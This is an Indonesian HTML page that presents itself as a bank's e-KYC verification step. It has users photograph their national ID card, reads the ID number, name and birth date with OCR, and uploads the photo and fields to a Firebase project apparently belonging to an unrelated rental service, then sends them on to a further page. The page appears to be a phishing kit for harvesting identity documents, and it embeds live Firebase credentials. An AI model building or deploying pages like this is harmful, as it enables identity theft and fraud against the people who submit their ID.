<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>e-KYC Bank System</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/tesseract.js@4/dist/tesseract.min.js"></script>

<style>
body{margin:0;background:#000;color:#fff;font-family:'Orbitron';text-align:center;}
.frame{width:85%;max-width:420px;aspect-ratio:10/6;border:2mm solid #888;margin:20px auto;border-radius:10px;background:#111;display:flex;justify-content:center;align-items:center;position:relative;}
.frame img{width:100%;height:100%;object-fit:cover;display:none;}
.label{position:absolute;color:#00aaff;}
.btn{width:85%;max-width:420px;padding:14px;margin:10px auto;background:linear-gradient(45deg,#003366,#0055aa);color:#000;font-weight:900;border:none;border-radius:8px;cursor:pointer;}
.input{width:85%;max-width:420px;padding:10px;margin:5px auto;border-radius:6px;border:none;}
.checkbox{display:none;width:85%;max-width:420px;margin:10px auto;font-size:12px;text-align:left;}
#loadingScreen{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:none;justify-content:center;align-items:center;flex-direction:column;z-index:999;}
.loader{border:5px solid #222;border-top:5px solid #00aaff;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;}
@keyframes spin{100%{transform:rotate(360deg);}}
#uploadBar{width:85%;max-width:420px;margin:10px auto;display:none;}
#uploadBar div{height:10px;background:#222;border-radius:10px;overflow:hidden;}
#uploadProgress{height:100%;width:0%;background:#00aaff;}
#popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);display:none;justify-content:center;align-items:center;}
.popup-box{background:#111;padding:20px;border-radius:10px;}
</style>

</head>
<body>

<h2>VERIFIKASI e-KYC BANK</h2>

<div class="frame">
 <img id="preview">
 <div class="label" id="label">FOTO KTP</div>
</div>

<input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>
<button class="btn" id="btnFoto">AMBIL FOTO KTP</button>

<input class="input" id="nik" placeholder="NIK">
<input class="input" id="nama" placeholder="Nama">
<input class="input" id="ttl" placeholder="TTL (DD / MM / YYYY)">

<div class="checkbox" id="box">
 <input type="checkbox" id="check"> Data sudah sesuai
</div>

<div id="uploadBar">
 <div><div id="uploadProgress"></div></div>
 <p id="uploadText">Upload 0%</p>
</div>

<div id="loadingScreen">
 <div class="loader"></div>
 <p id="loadingText">Memproses OCR...</p>
</div>

<div id="popup">
 <div class="popup-box">
  <h3>Berhasil</h3>
  <button onclick="next()">LANJUT</button>
 </div>
</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getStorage, ref, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
import { getFirestore, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

// ================= FIREBASE =================
const firebaseConfig = {
 apiKey: "AIzaSyAXMiJ8u65ex6D3LtbrzKyEKhAeGtg7Zps",
 authDomain: "nskrental-bbf87.firebaseapp.com",
 projectId: "nskrental-bbf87",
 storageBucket: "nskrental-bbf87.appspot.com",
 appId: "1:654715207587:web:73f5281b0fdcdecf8c6416"
};

const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const db = getFirestore(app);

// ================= ELEMENT =================
const btnFoto=document.getElementById("btnFoto");
const cameraInput=document.getElementById("cameraInput");
const preview=document.getElementById("preview");
const nik=document.getElementById("nik");
const nama=document.getElementById("nama");
const ttl=document.getElementById("ttl");
const check=document.getElementById("check");
const box=document.getElementById("box");
const loading=document.getElementById("loadingScreen");
const uploadBar=document.getElementById("uploadBar");
const uploadProgress=document.getElementById("uploadProgress");
const uploadText=document.getElementById("uploadText");
const popup=document.getElementById("popup");

let fileBlob=null;

// ================= CAMERA =================
btnFoto.onclick=()=>cameraInput.click();

cameraInput.onchange=async e=>{
 const file=e.target.files[0];
 fileBlob=file;
 preview.src=URL.createObjectURL(file);
 preview.style.display="block";
 document.getElementById("label").style.display="none";

 loading.style.display="flex";

 const img=new Image();
 img.src=preview.src;
 await new Promise(r=>img.onload=r);

 const canvas=document.createElement("canvas");
 const ctx=canvas.getContext("2d");

 canvas.width=1000;
 canvas.height=(img.height/img.width)*1000;

 ctx.drawImage(img,0,0,canvas.width,canvas.height);

 let data=ctx.getImageData(0,0,canvas.width,canvas.height);
 let d=data.data;

 for(let i=0;i<d.length;i+=4){
  let v=(d[i]+d[i+1]+d[i+2])/3;
  v=v>140?255:0;
  d[i]=d[i+1]=d[i+2]=v;
 }

 ctx.putImageData(data,0,0);

 const result=await Tesseract.recognize(canvas,'eng+ind');
 const text=result.data.text.toUpperCase();

 nik.value=(text.match(/\b\d{16}\b/)||[""])[0];
 nama.value=((text.match(/NAMA\s*[:\-]?\s*([A-Z\s]+)/)||["",""])[1]);
 const ttlRaw=text.match(/(\d{2})[\/\-]?(\d{2})[\/\-]?(\d{4})/);
 ttl.value=ttlRaw?`${ttlRaw[1]} / ${ttlRaw[2]} / ${ttlRaw[3]}`:"";

 loading.style.display="none";
 box.style.display="block";
}

// ================= VALIDASI =================
function validate(){
 if(!nik.value||nik.value.length!==16)return false;
 if(nama.value.length<3)return false;
 if(!ttl.value)return false;
 return true;
}

// ================= UPLOAD =================
check.onchange=()=>{
 if(!check.checked||!fileBlob)return;
 if(!validate()){alert("Data invalid");check.checked=false;return;}

 const name="ktp_"+Date.now()+".jpg";
 const storageRef=ref(storage,name);
 const task=uploadBytesResumable(storageRef,fileBlob);

 uploadBar.style.display="block";

 task.on("state_changed",snap=>{
  let p=Math.round((snap.bytesTransferred/snap.totalBytes)*100);
  uploadProgress.style.width=p+"%";
  uploadText.innerText="Upload "+p+"%";
 },
 err=>alert(err.message),
 async()=>{
  await addDoc(collection(db,"verifikasi"),{
   nik:nik.value,
   nama:nama.value,
   ttl:ttl.value,
   file:name,
   createdAt:serverTimestamp()
  });

  popup.style.display="flex";
 });
}

function next(){
 window.location.href="index3.html";
}

</script>

</body>
</html>
